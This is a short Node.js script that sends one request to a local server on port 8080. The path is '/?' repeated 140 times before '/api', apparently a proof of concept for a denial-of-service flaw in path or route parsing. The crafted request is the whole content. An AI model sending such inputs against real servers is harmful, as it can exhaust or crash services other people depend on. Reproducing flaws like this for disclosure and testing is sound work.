const http = require("http");

const genPath = (numRepeat) => {
  return "/?".repeat(numRepeat);
};
const options = {
  host: "127.0.0.1",
  port: 8080,
  path: genPath(140).concat("/api"),
};

// Make a request
const req = http.request(options, (res) => {
  res.setEncoding("utf8");
  res.on("data", (chunk) => {
    console.log(`BODY: ${chunk}`);
  });
  res.on("end", () => {
    console.log("No more data in response.");
  });
});
req.end();
